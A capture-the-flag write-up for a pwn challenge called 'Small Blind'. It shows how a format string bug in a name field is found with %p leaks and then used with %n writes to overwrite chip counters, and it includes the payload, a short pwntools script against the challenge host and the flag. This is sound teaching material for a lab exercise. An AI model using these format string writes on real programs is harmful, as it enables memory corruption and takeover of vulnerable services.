# UTCTF — Small Blind Writeup

## Challenge Info
- Category: Pwn
- Vulnerability: Format String
- Connection: nc challenge.utctf.live 7255

## Summary
Format string in name input allows memory write with %n.
We overwrite chip counter to win instantly.

## Recon
Test:
%p %p %p

Leaked stack values → format string confirmed.

## Leak stack

%1$p
%2$p
...
%29$p

Found:
0x1f4000001f4

= 500 / 500 chips

## Useful offsets

%6$p → pointer
%7$p → pointer

These point to chip values.

## Write test

%1000c%6$n
%1000c%7$n

Confirmed write.

## Exploit

payload:
%20c%6$n%49980c%7$n

## Script

from pwn import *
p = remote("challenge.utctf.live",7255)
p.recvuntil(b"name:")
p.sendline(b"%20c%6$n%49980c%7$n")
p.interactive()

## Flag

utflag{counting_chars_not_cards}

## Notes

Converted to GitHub Markdown version.
